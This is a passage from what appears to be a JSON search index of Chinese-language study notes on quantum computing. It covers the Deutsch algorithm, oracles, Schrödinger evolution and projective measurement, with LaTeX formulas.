\u8fdb\u884c\u91cf\u5b50\u5e76\u884c\u8ba1\u7b97\u3002</p>"},{"location":"cs/quantum/chapter1/#deutsch","title":"Deutsch \u7b97\u6cd5","text":"<p>Deutsch \u7b97\u6cd5\u662f\u91cf\u5b50\u8ba1\u7b97\u7684\u7b2c\u4e00\u4e2a\u91cf\u5b50\u7b97\u6cd5\uff0c\u7528\u4e8e\u5224\u65ad\u4e00\u4e2a\u51fd\u6570 \\(f(x)\\) \u662f\u5426\u662f\u5e38\u51fd\u6570\uff08\u5bf9\u4e8e\u6240\u6709\u8f93\u5165\u90fd\u8f93\u51fa\u76f8\u540c\u503c\uff09\u6216\u8005\u5e73\u8861\u51fd\u6570\uff08\u5bf9\u4e8e\u4e00\u534a\u8f93\u5165\u8f93\u51fa 0\uff0c\u53e6\u4e00\u534a\u8f93\u5165\u8f93\u51fa 1\uff09\u3002</p>"},{"location":"cs/quantum/chapter1/#_24","title":"\u7ecf\u5178\u7b97\u6cd5","text":"<p>\u5bf9\u4e8e n \u4f4d\u8f93\u5165 \\(x\\)\uff0c\u9700\u8981\u67e5\u8be2 \\(2^{n-1} + 1\\) \u6b21\u624d\u80fd\u5224\u65ad\u51fd\u6570 \\(f(x)\\) \u662f\u5426\u662f\u5e38\u51fd\u6570\u6216\u8005\u5e73\u8861\u51fd\u6570\u3002</p>"},{"location":"cs/quantum/chapter1/#_25","title":"\u91cf\u5b50\u7b97\u6cd5","text":"<p>\u5148\u8003\u8651\u5355\u91cf\u5b50\u6bd4\u7279\u7684\u60c5\u51b5\uff0c\u51fd\u6570 \\(f(x)\\) \u6709\u56db\u79cd\u53ef\u80fd\uff1a</p> <ul> <li>\u5e73\u8861\u51fd\u6570\uff1a\\(f(x) = \\neg x, f(x) = x\\)</li> <li>\u5e38\u6570\u51fd\u6570\uff1a\\(f(x) = \\left\\lvert 0 \\right\\rangle, f(x) = \\left\\lvert 1 \\right\\rangle\\)</li> </ul> <p>Deutsch \u7b97\u6cd5\u7684\u91cf\u5b50\u7535\u8def\u5982\u4e0b\uff1a</p> <p>\u521d\u59cb\u5316\u91cf\u5b50\u6bd4\u7279\u4e3a \\( \\left\\lvert 01 \\right\\rangle \\)\u3002</p> <p>\u5bf9\u4e24\u4e2a\u91cf\u5b50\u6bd4\u7279\u65bd\u52a0 Hadamard \u95e8\u5f97\u5230</p> \\[     \\left\\lvert \\psi_1 \\right\\rangle = \\frac{1}{2} \\left( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle \\right) \\left( \\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle \\right) \\] <p>\u7531\u4e8e\u5f02\u6216\u8fd0\u7b97\u7684\u7279\u6027\uff0c\u5f97</p> \\[     \\left\\lvert x, y \\right\\rangle \\rightarrow \\left\\lvert x, y \\oplus f(x) \\right\\rangle = \\left\\lvert x \\right\\rangle (-1)^{f(x)} \\left\\lvert y \\right\\rangle \\] <p>\u5f97\u5230</p> \\[     \\begin{aligned}     \\left\\lvert \\psi_2 \\right\\rangle &amp;= U_f \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle \\right) \\left\\lvert y \\right\\rangle \\\\     &amp;= \\frac{1}{\\sqrt{2}} \\left( U_f \\left\\lvert 0 \\right\\rangle \\left\\lvert y \\right\\rangle + U_f \\left\\lvert 1 \\right\\rangle \\left\\lvert y \\right\\rangle \\right) \\\\     &amp;= \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle (-1)^{f(0)} \\left\\lvert y \\right\\rangle + \\left\\lvert 1 \\right\\rangle (-1)^{f(1)} \\left\\lvert y \\right\\rangle \\right) \\\\     &amp;= \\frac{\\left\\lvert 0 \\right\\rangle (-1)^{f(0)} + \\left\\lvert 1 \\right\\rangle (-1)^{f(1)}}{\\sqrt{2}} \\left\\lvert y \\right\\rangle     \\end{aligned} \\] <p>\u5206\u7c7b\u8ba8\u8bba\u53ef\u77e5</p> \\[     \\left\\lvert \\psi_2 \\right\\rangle =     \\begin{cases}         \\pm \\left[ \\frac{\\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle}{\\sqrt{2}} \\right] \\left[ \\frac{\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle}{\\sqrt{2}} \\right], &amp; \\text{if}\\ f(0) = f(1) \\\\         \\pm \\left[ \\frac{\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle}{\\sqrt{2}} \\right] \\left[ \\frac{\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle}{\\sqrt{2}} \\right], &amp; \\text{if}\\ f(0) \\neq f(1)     \\end{cases} \\] <p>\u5bf9\u7b2c\u4e00\u4e2a\u91cf\u5b50\u6bd4\u7279\u65bd\u52a0 Hadamard \u95e8\uff0c\u5f97\u5230</p> \\[     \\left\\lvert \\psi_3 \\right\\rangle =     \\begin{cases}         \\pm \\left\\lvert 0 \\right\\rangle \\left[ \\frac{\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle}{\\sqrt{2}} \\right], &amp; \\text{if}\\ f(0) = f(1) \\\\         \\pm \\left\\lvert 1 \\right\\rangle \\left[ \\frac{\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle}{\\sqrt{2}} \\right], &amp; \\text{if}\\ f(0) \\neq f(1)     \\end{cases}     = \\pm \\left\\lvert f(0) \\oplus f(1) \\right\\rangle \\left[ \\frac{\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle}{\\sqrt{2}} \\right] \\] <p>\u6d4b\u91cf\u7b2c\u4e00\u4e2a\u91cf\u5b50\u6bd4\u7279\uff0c\u82e5\u6d4b\u91cf\u7ed3\u679c\u4e3a \\( \\left\\lvert 0 \\right\\rangle \\)\uff0c\u5219\u51fd\u6570\u4e3a\u5e38\u51fd\u6570\uff1b\u82e5\u6d4b\u91cf\u7ed3\u679c\u4e3a \\( \\left\\lvert 1 \\right\\rangle \\)\uff0c\u5219\u51fd\u6570\u4e3a\u5e73\u8861\u51fd\u6570\u3002</p>"},{"location":"cs/quantum/chapter1/#oracle","title":"Oracle","text":"<p>Oracle \u662f\u4e00\u4e2a\u9ed1\u76d2\u5b50\uff0c\u7528\u4e8e\u63cf\u8ff0\u4e00\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\uff0c\u53ea\u77e5\u9053\u884c\u4e3a\uff0c\u4e0d\u77e5\u9053\u5185\u90e8\u5b9e\u73b0\u3002</p> <p>\u91cf\u5b50\u8ba1\u7b97\u4e2d\uff0cOracle \u7684\u529f\u80fd \\(f\\) \u53ef\u4ee5\u8868\u793a\u4e3a</p> \\[     f(\\left\\lvert \\Psi \\right\\rangle) =     \\begin{cases}     \\left\\lvert 1 \\right\\rangle, &amp; \\text{if}\\ \\left\\lvert \\Psi \\right\\rangle \\in \\text{certian set}\\ S \\\\     \\left\\lvert 0 \\right\\rangle, &amp; \\text{else}     \\end{cases} \\]"},{"location":"cs/quantum/chapter1/#oracle_1","title":"Oracle \u7ebf\u8def\u8bbe\u8ba1","text":"<p>\u5176\u4e2d Input A \u4e3a\u56fa\u5b9a\u7684 \\(\\left\\lvert 0 \\right\\rangle\\)\uff0cOutput A \u4e3a\u64cd\u4f5c\u7ed3\u679c\uff0cOutput B \u4e3a\u5197\u4f59\u8f93\u51fa\u3002</p> <p>\u6839\u636e \\(f\\) \u7684\u5b9a\u4e49\uff0c\u53ef\u4ee5\u5f97\u5230\u4e0a\u56fe\u56db\u79cd Oracle \u7ebf\u8def\u3002</p>"},{"location":"cs/quantum/chapter1/#oracle_2","title":"Oracle \u7ebf\u8def\u7b80\u5316","text":"<p>\u7b80\u5316\u89c4\u5219\uff1a</p> <ul> <li>\\(HH = I\\)</li> <li>\\(HXH = Z\\)</li> <li> <p>CNOT \u7b80\u5316\uff1a</p> <p>\u6839\u636e\u63a7\u5236\u6bd4\u7279\u4e3a\u9ad8\u4f4d\u6bd4\u7279\u8fd8\u662f\u4f4e\u4f4d\u6bd4\u7279\uff0cCNOT \u95e8\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\uff1a</p> \\[     \\mathrm{CNOT}_{\\text{low}} =     \\begin{bmatrix}         1 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; 1 \\\\         0 &amp; 0 &amp; 1 &amp; 0 \\\\         0 &amp; 1 &amp; 0 &amp; 0     \\end{bmatrix}     , \\mathrm{CNOT}_{\\text{high}} =     \\begin{bmatrix}         1 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; 1 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; 1 \\\\         0 &amp; 0 &amp; 1 &amp; 0     \\end{bmatrix} \\] <p>\u7b80\u5316\u89c4\u5219\uff1a</p> \\[     (H \\otimes H) \\mathrm{CNOT}_{\\text{low}} (H \\otimes H) = \\mathrm{CNOT}_{\\text{high}} \\] <p>\u5199\u51fa\u77e9\u9635\u5f62\u5f0f\u53ef\u4ee5\u9a8c\u8bc1\u3002</p> </li> </ul>"},{"location":"cs/quantum/chapter1/#_26","title":"\u91cf\u5b50\u7535\u8def\u90e8\u7f72\u6d41\u7a0b","text":"<p>\u6ce2\u5f62\u751f\u6210\uff1a\u6bcf\u79cd\u57fa\u7840\u95e8\u90fd\u6709\u5176\u5bf9\u5e94\u7684\u6ce2\u5f62\uff0c\u5c06\u91cf\u5b50\u95e8\u8f6c\u6362\u6210\u91cf\u5b50\u82af\u7247\u53ef\u8bc6\u522b\u7684\u6ce2\u5f62\u662f\u6ce2\u5f62\u5c42\u7f16\u8bd1\u7684\u4e00\u90e8\u5206\u3002\u4e24\u6bd4\u7279\u91cf\u5b50\u95e8\u5219\u6bcf\u4e2a\u6bd4\u7279\u6709\u4e24\u6bb5\u6ce2\u5f62\uff0c\u5355\u95e8\u6ce2\u5f62\u4e00\u822c\u53ea\u6709\u4e00\u6bb5\u3002</p>"},{"location":"cs/quantum/chapter2/","title":"\u91cf\u5b50\u6d4b\u91cf\u4e0e\u91cf\u5b50\u56fe\u7075\u673a","text":""},{"location":"cs/quantum/chapter2/#_2","title":"\u91cf\u5b50\u6001\u6f14\u5316","text":""},{"location":"cs/quantum/chapter2/#_3","title":"\u6ce2\u51fd\u6570","text":"<p>\u6ce2\u51fd\u6570\u662f\u91cf\u5b50\u529b\u5b66\u7684\u57fa\u672c\u5047\u8bbe\uff0c\u6700\u7b80\u5355\u7684\u5f62\u5f0f\u662f \\(\\phi(x) = Ae^{i(p/\\hbar)x}\\)\uff0c\u8868\u793a\u4e86\u7c92\u5b50\u5728\u67d0\u4e00\u4f4d\u7f6e\u7684\u6982\u7387\u5e45\u3002\\(\\lVert \\phi(x) \\rVert^2\\) \u8868\u793a\u4e86\u7c92\u5b50\u5728\u8be5\u4f4d\u7f6e\u7684\u6982\u7387\u5bc6\u5ea6\u3002\u6ee1\u8db3\u5f52\u4e00\u5316\u6761\u4ef6\uff0c\u5373\u5bf9\u6574\u4e2a\u7a7a\u95f4\u79ef\u5206\u4e3a 1\u3002</p>"},{"location":"cs/quantum/chapter2/#_4","title":"\u54c8\u5bc6\u987f\u91cf","text":"<p>\u8868\u793a\u4e3a \\(H\\)\uff0c\u662f\u4e00\u4e2a\u5384\u7c73\u7b97\u7b26\u3002\u4f5c\u7528\u4e8e\u7cfb\u7edf\u7684\u6ce2\u51fd\u6570\u4e0a\uff0c\u4ea7\u751f\u7cfb\u7edf\u7684\u80fd\u91cf\u548c\u52a8\u529b\u5b66\u6f14\u5316\u3002</p> <p>\u7531\u52a8\u529b\u9879\u548c\u52bf\u80fd\u9879\u7ec4\u6210\u3002</p> <ul> <li>\u52a8\u80fd\u9879\u63cf\u8ff0\u4e86\u7cfb\u7edf\u4e2d\u7c92\u5b50\u7684\u8fd0\u52a8\u80fd\u91cf\uff0c\u901a\u5e38\u7528\u52a8\u91cf\u7b97\u7b26\u548c\u8d28\u91cf\u6765\u8868\u793a\u3002</li> <li>\u52bf\u80fd\u9879\u63cf\u8ff0\u4e86\u7cfb\u7edf\u4e2d\u7c92\u5b50\u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u548c\u53d7\u5230\u7684\u5916\u90e8\u573a\u7684\u5f71\u54cd\uff0c\u53ef\u4ee5\u662f\u4f4d\u7f6e\u7b97\u7b26\u548c\u5916\u90e8\u52bf\u573a\u7684\u51fd\u6570\u3002</li> </ul> \\[     \\hat{H} = -\\frac{\\hbar^2}{2m} \\nabla^2 + V(\\bar{r}) \\] <p>\u54c8\u5bc6\u987f\u91cf\u8868\u8fbe\u5f0f\u7684\u7b2c\u4e00\u9879\u5b9e\u5219\u4e3a\u7c92\u5b50\u7684\u52a8\u80fd\uff0c\u7b2c\u4e8c\u9879\u662f\u4e00\u4e2a\u7a7a\u95f4\u4f4d\u7f6e\u7684\u51fd\u6570\uff0c\u5373\u52bf\u80fd\u51fd\u6570\uff0c\u8868\u793a\u7c92\u5b50\u5904\u5728\u4e0d\u540c\u4f4d\u7f6e\u65f6\u7684\u52bf\u80fd\u3002</p> \\[     \\hat{H} = \\hat{T} + \\hat{V} = \\frac{\\mathbf{\\hat{p}}^2}{2m} + V(\\mathbf{r}, t) = -\\frac{\\hbar^2}{2m} \\nabla^2 + V(\\mathbf{r}, t) \\] <p>\u54c8\u5bc6\u987f\u91cf\u7684\u672c\u5f81\u503c\u662f\u7cfb\u7edf\u80fd\u91cf\u7684\u53ef\u80fd\u53d6\u503c\uff0c\u5bf9\u5e94\u7684\u7279\u5f81\u5411\u91cf\u662f\u5728\u8be5\u80fd\u91cf\u53d6\u503c\u4e0b\u7684\u72b6\u6001\u5411\u91cf\u3002</p>"},{"location":"cs/quantum/chapter2/#_5","title":"\u859b\u5b9a\u8c14\u65b9\u7a0b\u4e0e\u91cf\u5b50\u6001\u6f14\u5316","text":"<p>\\(H\\) \u53ef\u4ee5\u548c\u65f6\u95f4\u6709\u5173\uff0c\u4e5f\u53ef\u4ee5\u72ec\u7acb\u4e0e\u65f6\u95f4\u3002\u82e5\u4e0e\u65f6\u95f4\u72ec\u7acb\uff0c\u5219\u859b\u5b9a\u8c14\u65b9\u7a0b\u4e3a\uff1a</p> \\[     i\\hbar \\frac{\\mathrm{d}}{\\mathrm{d}\\ t} \\left\\lvert \\psi(t) \\right\\rangle = \\hat{H} \\left\\lvert \\psi(t) \\right\\rangle \\] <p>\u79fb\u9879\u540e\u79ef\u5206\uff1a</p> \\[     \\begin{aligned}         \\int_{t_1}^{t_2} \\frac{i\\hbar}{\\left\\lvert \\psi(t) \\right\\rangle} \\mathrm{d} \\left\\lvert \\psi(t) \\right\\rangle &amp;= \\int_{t_1}^{t_2} \\hat{H} \\mathrm{d} t \\\\         i\\hbar (\\ln \\left\\lvert \\psi(t_2) \\right\\rangle - \\ln \\left\\lvert \\psi(t_1) \\right\\rangle) &amp;= \\hat{H} (t_2 - t_1)     \\end{aligned} \\] <p>\u5f97\u5230\uff1a</p> \\[     \\left\\lvert \\psi(t_2) \\right\\rangle = e^{\\frac{-i\\hat{H}\\Delta t}{\\hbar}} \\left\\lvert \\psi(t_1) \\right\\rangle \\] <p>\u8bbe \\(t_1 = 0, t_2 = t\\)\uff0c\u5219\uff1a</p> \\[     \\left\\lvert \\psi(t) \\right\\rangle = e^{\\frac{-i\\hat{H}t}{\\hbar}} \\left\\lvert \\psi(0) \\right\\rangle = U \\left\\lvert \\psi(0) \\right\\rangle \\] <p>\u8be5\u5f0f\u8868\u660e\uff0c\u91cf\u5b50\u6001\u4ece\u521d\u6001\u5230\u7ec8\u6001\u7684\u6f14\u5316\u53ef\u4ee5\u7531\u4e00\u4e2a\u4e0e \\(H\\) \u6709\u5173\u7684\u7b97\u5b50\u8868\u793a\uff0c\u8be5\u7b97\u5b50\u53c8\u88ab\u79f0\u4e3a\u65f6\u95f4\u6f14\u5316\u7b97\u5b50 \\(U\\)\uff0c\u4e14 \\(U\\) \u4e00\u5b9a\u662f\u5e7a\u6b63\u7684\u3002</p>"},{"location":"cs/quantum/chapter2/#_6","title":"\u7ebf\u6027\u4e0e\u975e\u7ebf\u6027\u91cf\u5b50\u6001\u6f14\u5316","text":"<p>\u6839\u636e\u91cf\u5b50\u529b\u5b66\u539f\u7406\uff0c\u91cf\u5b50\u6001\u6f14\u5316\u8fc7\u7a0b\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff1a</p> <ol> <li>\u7ebf\u6027\u6f14\u5316\u8fc7\u7a0b\uff1a\u5982\u679c\u4e00\u4e2a\u7269\u7406\u7cfb\u7edf\u6ca1\u6709\u88ab\u6d4b\u91cf\uff0c\u5b83\u5c06\u6309\u7167\u859b\u5b9a\u8c14\u65b9\u7a0b\u4ee5\u4e00\u79cd\u786e\u5b9a\u7684\u3001\u7ebf\u6027\u7684\u65b9\u5f0f\u6f14\u5316\u3002</li> <li>\u975e\u7ebf\u6027\u6f14\u5316\u8fc7\u7a0b\uff1a\u5982\u679c\u5bf9\u7cfb\u7edf\u8fdb\u884c\u4e00\u4e2a\u6d4b\u91cf\uff0c\u7cfb\u7edf\u5c06\u7acb\u5373\u975e\u7ebf\u6027\u5730\u3001\u968f\u673a\u5730\u4ece\u521d\u59cb\u7684\u53e0\u52a0\u6001\u8dc3\u8fc1\u5230\u6b63\u88ab\u6d4b\u91cf\u7684\u53ef\u89c2\u6d4b\u91cf\u7684\u4e00\u4e2a\u672c\u5f81\u6001\uff0c\u8fd9\u65f6\uff0c\u5b9e\u9a8c\u8005\u5c31\u4f1a\u611f\u77e5\u5230\u4e00\u4e2a\u786e\u5b9a\u7684\u89c2\u5bdf\u503c\uff0c\u5373\u672c\u5f81\u6001\u76f8\u5e94\u7684\u672c\u5f81\u503c\u3002</li> </ol> <p>\u5373\u4f5c\u7528\u91cf\u5b50\u95e8\u65f6\uff0c\u91cf\u5b50\u6001\u7684\u6f14\u5316\u662f\u7ebf\u6027\u7684\uff0c\u800c\u6d4b\u91cf\u91cf\u5b50\u6001\u65f6\uff0c\u91cf\u5b50\u6001\u7684\u6f14\u5316\u662f\u975e\u7ebf\u6027\u7684\u3002</p>"},{"location":"cs/quantum/chapter2/#_7","title":"\u91cf\u5b50\u6d4b\u91cf","text":""},{"location":"cs/quantum/chapter2/#_8","title":"\u7279\u5f81\u503c\u4e0e\u7279\u5f81\u5411\u91cf\u7684\u51e0\u4f55\u610f\u4e49","text":"<p>\u77e9\u9635\u4e58\u6cd5\u5bf9\u5e94\u4e86\u4e00\u4e2a\u53d8\u6362\uff0c\u662f\u628a\u4efb\u610f\u4e00\u4e2a\u5411\u91cf\u53d8\u6210\u53e6\u4e00\u4e2a\u65b9\u5411\u6216\u957f\u5ea6\u90fd\u5927\u591a\u4e0d\u540c\u7684\u65b0\u5411\u91cf\u3002\u5982\u679c\u77e9\u9635\u5bf9\u67d0\u4e00\u4e2a\u5411\u91cf\u6216\u67d0\u4e9b\u5411\u91cf\u53ea\u53d1\u751f\u4f38\u7f29\u53d8\u6362\uff0c\u4e0d\u5bf9\u8fd9\u4e9b\u5411\u91cf\u4ea7\u751f\u65cb\u8f6c\u7684\u6548\u679c\uff0c\u90a3\u4e48\u8fd9\u4e9b\u5411\u91cf\u5c31\u79f0\u4e3a\u8fd9\u4e2a\u77e9\u9635\u7684\u7279\u5f81\u5411\u91cf\uff0c\u4f38\u7f29\u7684\u6bd4\u4f8b\u5c31\u662f\u7279\u5f81\u503c\u3002</p>"},{"location":"cs/quantum/chapter2/#_9","title":"\u7279\u5f81\u503c\u5206\u89e3","text":"<p>\u5411\u91cf \\(\\mathbf{v}\\) \u662f\u77e9\u9635 \\(A\\) \u7684\u7279\u5f81\u5411\u91cf\uff0c\u5bf9\u5e94\u7684\u7279\u5f81\u503c\u662f \\(\\lambda\\)\uff0c\u5219\u6709\uff1a</p> \\[     A\\mathbf{v} = \\lambda \\mathbf{v} \\] <p>\u7279\u5f81\u503c\u5206\u89e3\uff1a</p> \\[     A = Q \\Lambda Q^{-1} \\] <p>\u5176\u4e2d \\(\\Lambda\\) \u662f\u4e00\u4e2a\u5bf9\u89d2\u77e9\u9635\uff0c\u5bf9\u89d2\u7ebf\u4e0a\u7684\u5143\u7d20\u662f\u77e9\u9635 \\(A\\) \u7684\u7279\u5f81\u503c\uff0c\\(Q\\) \u662f \\(A\\) \u7684\u7279\u5f81\u5411\u91cf\u7ec4\u6210\u7684\u77e9\u9635\u3002</p>"},{"location":"cs/quantum/chapter2/#_10","title":"\u7279\u5f81\u503c\u5206\u89e3\u7684\u542b\u4e49","text":"<p>\u77e9\u9635 \\(A\\) \u7684\u4fe1\u606f\u53ef\u4ee5\u7531\u5176\u7279\u5f81\u503c\u548c\u7279\u5f81\u5411\u91cf\u8868\u793a\u3002</p> <p>\u5bf9\u4e8e\u77e9\u9635\u4e3a\u9ad8\u7ef4\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7\u7279\u5f81\u503c\u5206\u89e3\u5f97\u5230\u7684\u524d N \u4e2a\u7279\u5f81\u5411\u91cf\uff0c\u5c31\u5bf9\u5e94\u4e86\u8fd9\u4e2a\u77e9\u9635\u6700\u4e3b\u8981\u7684 N \u4e2a\u53d8\u5316\u65b9\u5411\u3002\u5229\u7528\u8fd9\u524d N \u4e2a\u53d8\u5316\u65b9\u5411\uff0c\u5c31\u53ef\u4ee5\u8fd1\u4f3c\u8fd9\u4e2a\u77e9\u9635\uff08\u53d8\u6362\uff09\u3002</p>"},{"location":"cs/quantum/chapter2/#_11","title":"\u91cf\u5b50\u8ba1\u7b97\u4e2d\u7684\u7279\u5f81\u5206\u89e3\uff08\u8c31\u5206\u89e3\uff09","text":"<p>\u53ea\u6709\u5bf9\u53ef\u5bf9\u89d2\u5316\u77e9\u9635\u624d\u53ef\u4ee5\u65bd\u4ee5\u7279\u5f81\u5206\u89e3\u3002\u7279\u5f81\u503c\u7684\u96c6\u5408 \\(\\{\\lambda_i\\}\\)\uff0c\u4e5f\u79f0\u4e3a\u201c\u8c31\u201d\uff08Spectrum\uff09\u3002\u5384\u7c73\u77e9\u9635\uff08\u5171\u8f6d\u5bf9\u79f0\u7684\u65b9\u9635\uff09\u5c5e\u4e8e\u6b63\u89c4\u77e9\u9635\uff0c\u6839\u636e\u6b63\u89c4\u77e9\u9635\u7684\u6027\u8d28\u53ef\u77e5\uff0c\u5176\u53ef\u4ee5\u5bf9\u89d2\u5316\u3002</p> <p>\u5047\u8bbe \\(A\\) \u662f\u4e00\u4e2a\u590d\u6570\u57df\u4e0a\u7684\u6b63\u89c4\u77e9\u9635\uff0c\u7279\u5f81\u503c\u4e3a \\(\\{\\lambda_i\\}\\)\uff0c\u6807\u51c6\u6b63\u4ea4\u57fa\u4e3a \\(\\{\\left\\lvert e_i\\right\\rangle\\}\\)\uff0c\u5219\u6709\uff1a</p> \\[     A = \\sum_i^n \\lambda_i \\left\\lvert e_i \\right\\rangle \\left\\langle e_i \\right\\rangle \\] <p>\u6807\u51c6\u6b63\u4ea4\u57fa\u7684\u5b8c\u5907\u6027\u65b9\u7a0b\u4e3a\uff1a</p> \\[     \\sum_i^n \\left\\lvert e_i \\right\\rangle \\left\\langle e_i \\right\\rvert = I \\] <p>\u53ef\u901a\u8fc7\u5b8c\u5907\u6027\u65b9\u7a0b\u68c0\u9a8c\u4e00\u7ec4\u57fa\u662f\u5426\u662f\u6807\u51c6\u6b63\u4ea4\u57fa\u3002</p>"},{"location":"cs/quantum/chapter2/#_12","title":"\u6295\u5f71\u7b97\u5b50","text":"<p>\u5b9a\u4e49\u6295\u5f71\u5230\u5355\u4f4d\u5411\u91cf \\(\\left\\lvert e_k \\right\\rangle\\) \u4e0a\u7684\u6295\u5f71\u7b97\u5b50\u4e3a\uff1a</p> \\[     P_k = \\left\\lvert e_k \\right\\rangle \\left\\langle e_k \\right\\rvert \\] <p>\u6ee1\u8db3\u6027\u8d28\uff1a</p> <ul> <li>\\(P_k^2 = P_k\\)</li> <li>\\(P_k P_j = \\delta_{kj} P_k\\)</li> <li>\\(\\sum_k P_k = I\\)</li> </ul> <p>\u5219\u590d\u6570\u57df\u4e0a\u7684\u6b63\u89c4\u77e9\u9635 \\(A\\) \u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[     A = \\sum_i^n \\lambda_i \\left\\lvert e_i \\right\\rangle \\left\\langle e_i \\right\\rvert = \\sum_i^n \\lambda_i P_i \\] <p>\u56e0\u6b64 \\(A\\) \u4f5c\u7528\u4e8e\u4efb\u4f55\u5411\u91cf\uff0c\u5176\u51e0\u4f55\u610f\u4e49\u4e3a\uff1a\u8be5\u5411\u91cf\u6295\u5f71\u5230 \\(A\\) \u7684\u5404\u7279\u5f81\u5411\u91cf\u4e0a\uff0c\u7136\u540e\u518d\u4ee5\u7279\u5f81\u503c \\(\\lambda_i\\) \u4e3a\u6743\u91cd\u8fdb\u884c\u7ebf\u6027\u7ec4\u5408\u3002</p>"},{"location":"cs/quantum/chapter2/#_13","title":"\u91cf\u5b50\u6d4b\u91cf","text":"<ul> <li>\u4e00\u822c\u6d4b\u91cf</li> <li>\u6295\u5f71\u6d4b\u91cf</li> <li>POVM \u6d4b\u91cf</li> </ul> <p>\u5bf9\u4e8e\u9009\u5b9a\u7684\u89c2\u6d4b\u6027\u8d28\uff0c\u6211\u4eec\u9700\u8981\u6267\u884c\u76f8\u5e94\u7684\u6d4b\u91cf\u7b97\u7b26\u3002\u6bcf\u4e2a\u53ef\u80fd\u7684\u6d4b\u91cf\u7ed3\u679c\u90fd\u5bf9\u5e94\u4e00\u4e2a\u6d4b\u91cf\u7b97\u7b26\u7684\u7279\u5f81\u503c \\(\\lambda_i\\)\uff0c\u7531\u53ef\u89c2\u6d4b\u91cf \\(\\lvert P\\left\\lvert \\psi \\right\\rangle \\rvert^2\\) \u63cf\u8ff0\u3002</p>"},{"location":"cs/quantum/chapter2/#_14","title":"\u6295\u5f71\u6d4b\u91cf\u7684\u53ef\u89c2\u6d4b\u91cf","text":"<p>\u53ef\u89c2\u6d4b\u91cf\u7531 \\(A\\) \u8868\u793a\uff0c\u4e3a\u5f85\u89c2\u6d4b\u7cfb\u7edf\u4e0a\u7684\u5384\u7c73\u7b97\u5b50\uff0c\u53ef\u4ee5\u5199\u6210\u8c31\u5206\u89e3\u7684\u5f62\u5f0f\uff1a</p> \\[     A = \\sum_i^n \\lambda_i P_i \\] <p>\u6d4b\u91cf\u7684\u53ef\u80fd\u7ed3\u679c\u4e0e \\(A\\) \u7684\u7279\u5f81\u503c \\(\\lambda_i\\) \u76f8\u5bf9\u5e94\u3002\u5bf9\u72b6\u6001 \\(\\left\\lvert \\psi \\right\\rangle\\) \u8fdb\u884c\u6d4b\u91cf\uff0c\u5f97\u5230\u7684\u7ed3\u679c \\(i\\) \u7684\u6982\u7387\u4e3a\uff1a</p> \\[     p_i = p(\\lambda = \\lambda_i) = \\left\\langle \\psi \\right\\lvert P_i^\\dagger P_i \\left\\lvert \\psi \\right\\rangle = \\left\\langle \\psi \\right\\lvert P_i \\left\\lvert \\psi \\right\\rangle \\] <p>\u6d4b\u91cf\u540e\u7684\u6001\u574d\u7f29\u4e3a\uff1a</p> \\[     \\frac{P_i \\left\\lvert \\psi \\right\\rangle}{\\sqrt{p_i}} \\] <p>\u89c2\u6d4b\u91cf\u7684\u5e73\u5747\u503c\u4e3a\uff1a</p> \\[     E(A) = \\sum_i^n \\lambda_i p_i = \\left\\langle \\psi \\right\\lvert A \\left\\lvert \\psi \\right\\rangle = \\left\\langle A \\right\\rangle \\] <p>\u6807\u51c6\u5dee\uff1a</p> \\[     \\Delta(A) = \\sqrt{\\left\\langle (A - \\left\\langle A \\right\\rangle)^2 \\right\\rangle} = \\sqrt{\\left\\langle A^2 \\right\\rangle - \\left\\langle A \\right\\rangle^2} \\]"},{"location":"cs/quantum/chapter2/#_15","title":"\u6295\u5f71\u6d4b\u91cf\u7684\u6d4b\u91cf\u7b97\u5b50","text":"<p>\u91cf\u5b50\u6d4b\u91cf\u7531\u6295\u5f71\u7b97\u5b50\u7684\u96c6\u5408 \\(\\{P_i\\}\\) \u63cf\u8ff0\uff0c\u6295\u5f71\u7b97\u5b50\u662f\u4e00\u7c7b\u7279\u6b8a\u7684\u5384\u7c73\u7b97\u7b26\uff0c\u5b83\u7684\u672c\u5f81\u503c\u4e3a 0 \u6216 1\uff0c\u5176\u672c\u5f81\u6001\u5f62\u6210\u4e86\u6b63\u4ea4\u5f52\u4e00\u7684\u5b8c\u5907\u57fa\u3002</p> <p>\u6307\u6807(index) \\(i\\) \u8868\u793a\u5728\u5b9e\u9a8c\u4e0a\u53ef\u80fd\u53d1\u751f\u7684\u7ed3\u679c\u3002\u5982\u679c\u6d4b\u91cf\u524d\u7684\u91cf\u5b50\u7cfb\u7edf \u5904\u5728\u6700\u65b0\u72b6\u6001 \\(\\left\\lvert \\psi \\right\\rangle\\)\uff0c\u90a3\u4e48\u7ed3\u679c\u53d1\u751f\u7684\u6982\u7387\u4e3a:</p> \\[     p_i = \\left\\lvert P_i \\left\\lvert \\psi \\right\\rangle \\right\\rvert^2 = \\left\\langle \\psi \\right\\lvert P_i^\\dagger P_i \\left\\lvert \\psi \\right\\rangle = \\left\\langle \\psi \\right\\lvert P_i \\left\\lvert \\psi \\right\\rangle \\] <p>\u8bbe \\(P_i\\) \u7684\u672c\u5f81\u6001\u4e3a \\(\\left\\lvert \\alpha \\right\\rangle\\)\uff0c\u5219\u6982\u7387\u8fd8\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[     p_\\alpha = 